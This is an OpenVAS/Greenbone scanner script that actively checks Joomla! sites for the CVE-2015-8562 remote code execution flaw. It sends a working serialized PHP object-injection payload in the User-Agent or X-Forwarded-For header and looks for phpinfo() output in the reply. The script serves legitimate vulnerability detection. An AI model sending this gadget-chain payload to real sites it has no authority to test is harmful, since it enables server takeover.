# SPDX-FileCopyrightText: 2015 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:joomla:joomla";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105486");
  script_version("2024-11-08T15:39:48+0000");
  script_cve_id("CVE-2015-8562", "CVE-2015-8563", "CVE-2015-8564", "CVE-2015-8565");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2024-11-08 15:39:48 +0000 (Fri, 08 Nov 2024)");
  script_tag(name:"creation_date", value:"2015-12-16 15:35:12 +0100 (Wed, 16 Dec 2015)");
  script_name("Joomla! 1.5.0 < 3.4.6 RCE Vulnerability - Active Check");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2015 Greenbone AG");
  script_dependencies("joomla_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("joomla/http/detected");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/79195");
  script_xref(name:"URL", value:"https://developer.joomla.org/security-centre/630-20151214-core-remote-code-execution-vulnerability.html");

  script_tag(name:"summary", value:"Joomla! is prone to a remote code execution (RCE)
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response for
  the output of the phpinfo() command.");

  script_tag(name:"insight", value:"Browser information is not filtered properly while saving the
  session values into the database which leads to a Remote Code Execution vulnerability.");

  script_tag(name:"impact", value:"Successfully exploiting this issue allows attackers to execute
  arbitrary code in the context of the affected application.");

  script_tag(name:"affected", value:"Joomla! versions 1.5.0 through 3.4.5.");

  script_tag(name:"solution", value:"Update to version 3.4.6 or later.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_active");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("misc_func.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

vtstrings = get_vt_strings();

if( dir == "/" )
  dir = "";

ex = 'phpinfo();JFactory::getConfig();exit';
ex_len = strlen( ex );

agent = '}__' + vtstrings["default"] + '|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"' +
        "\0\0\0" + 'disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql"' +
        ':0:{}s:8:"feed_url";s:' + ex_len + ':"' + ex + '"' +
        ';s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"' +
        "\0\0\0" + 'connection";b:1;}';

agent += '\xf0\xfd\xfd\xfd';

injection = make_list( "User-Agent:", "X-Forwarded-For:" );

host = http_host_name( port:port );
cookie = NULL; # nb: To make openvas-nasl-lint happy...

foreach inj( injection ) {
  for( i = 0; i < 4; i++ ) {
    url = dir + "/";
    req = 'GET ' + url + ' HTTP/1.1\r\n' +
          'Host: ' + host + '\r\n' +
          'Connection: close\r\n';

    if( cookie ) req += 'Cookie: ' + cookie + '\r\n';

    req += 'Accept-Encoding: identity\r\n' +
           'Accept: */*\r\n' +
           inj + ' ' + agent + '\r\n\r\n';

    buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

    if( ! cookie ) {
      co = eregmatch( pattern:'Set-Cookie: ([^\r\n]+)', string:buf );
      cookie = co[1];
    }

    if( "<title>phpinfo()</title>" >< buf ) {
      report = http_report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );
